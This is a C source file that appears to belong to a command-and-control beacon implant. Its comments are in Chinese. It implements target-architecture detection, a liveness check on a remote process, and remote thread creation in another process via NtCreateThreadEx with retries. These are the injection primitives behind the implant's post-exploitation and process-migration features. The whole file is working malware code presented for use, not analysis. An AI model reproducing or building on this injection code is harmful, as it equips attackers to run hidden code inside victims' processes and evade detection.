#include "beacon_inject.h"

#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif

/* 查询目标进程的实际执行架构，兼容 WOW64 进程。 */
BOOL InjectGetProcessMachine(HANDLE process,
                             const CHAR* label,
                             WORD* machine,
                             CHAR* err,
                             SIZE_T err_size)
{
    SYSTEM_INFO native_info;
    BOOL is_wow64 = FALSE;

    if (!label) label = "target";
    if (machine) *machine = 0;
    if (!process || !machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "invalid %s process", label);
        return FALSE;
    }

    ZeroMemory(&native_info, sizeof(native_info));
    GetNativeSystemInfo(&native_info);
    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        *machine = IMAGE_FILE_MACHINE_I386;
        return TRUE;
    }

    if (!IsWow64Process(process, &is_wow64)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "%s arch query failed: %lu",
                             label, (ULONG)GetLastError());
        return FALSE;
    }

    if (is_wow64) {
        *machine = IMAGE_FILE_MACHINE_I386;
        return TRUE;
    }
    if (native_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        *machine = IMAGE_FILE_MACHINE_AMD64;
        return TRUE;
    }

    if (err) _snprintf_s(err, err_size, _TRUNCATE,
                         "unsupported %s architecture: %u",
                         label, (UINT)native_info.wProcessorArchitecture);
    return FALSE;
}

/* 检查远程进程是否仍处于运行状态，供创建远程线程前后复用。 */
BOOL InjectRemoteProcessAlive(HANDLE process,
                              CHAR* status,
                              SIZE_T status_size)
{
    DWORD wait_rc;
    DWORD exit_code = 0;

    if (status && status_size) {
        status[0] = '\0';
    }
    if (!process) {
        if (status) strcpy_s(status, status_size, "process=null");
        return FALSE;
    }

    wait_rc = WaitForSingleObject(process, 0);
    if (wait_rc == WAIT_TIMEOUT) {
        if (status) strcpy_s(status, status_size, "process=running");
        return TRUE;
    }
    if (wait_rc == WAIT_OBJECT_0) {
        if (GetExitCodeProcess(process, &exit_code)) {
            if (status) _snprintf_s(status, status_size, _TRUNCATE,
                                    "process=exited:0x%08lx",
                                    (ULONG)exit_code);
        } else if (status) {
            _snprintf_s(status, status_size, _TRUNCATE,
                        "process=exited:GetExitCodeProcess failed:%lu",
                        (ULONG)GetLastError());
        }
        return FALSE;
    }

    if (status) _snprintf_s(status, status_size, _TRUNCATE,
                            "process=wait_failed:%lu",
                            (ULONG)GetLastError());
    return FALSE;
}

/* 创建远程线程；PostEx 可配置多次重试，Migrate 当前只尝试一次。 */
BOOL InjectCreateRemoteThread(const Win32Api* api,
                              HANDLE process,
                              PVOID remote_entry,
                              PVOID thread_parameter,
                              UINT32 attempts,
                              DWORD retry_wait_ms,
                              const CHAR* invalid_request_error,
                              HANDLE* remote_thread,
                              CHAR* err,
                              SIZE_T err_size)
{
    HANDLE thread = NULL;
    UINT32 attempt;

    if (remote_thread) *remote_thread = NULL;
    if (err && err_size) err[0] = '\0';

    if (!api || !process || !remote_entry || !remote_thread) {
        if (err) strcpy_s(err, err_size,
                          invalid_request_error ?
                          invalid_request_error :
                          "invalid remote thread request");
        return FALSE;
    }
    if (attempts == 0) attempts = 1;

    for (attempt = 0; attempt < attempts; ++attempt) {
        CHAR process_status[96];
        NTSTATUS st;

        if (!InjectRemoteProcessAlive(process, process_status,
                                      sizeof(process_status))) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "NtCreateThreadEx skipped: %s",
                                 process_status);
            return FALSE;
        }

        thread = NULL;
        st = api->pfnNtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL,
                                      process, remote_entry, thread_parameter,
                                      0, 0, 0, 0, NULL);
        if (NT_SUCCESS(st) && thread) {
            *remote_thread = thread;
            return TRUE;
        }
        if (thread) CloseHandle(thread);

        if (st != STATUS_ACCESS_DENIED || attempt + 1 >= attempts) {
            if (err) _snprintf_s(err, err_size, _TRUNCATE,
                                 "NtCreateThreadEx failed: 0x%08lX",
                                 (ULONG)st);
            return FALSE;
        }
        Sleep(retry_wait_ms);
    }

    return FALSE;
}
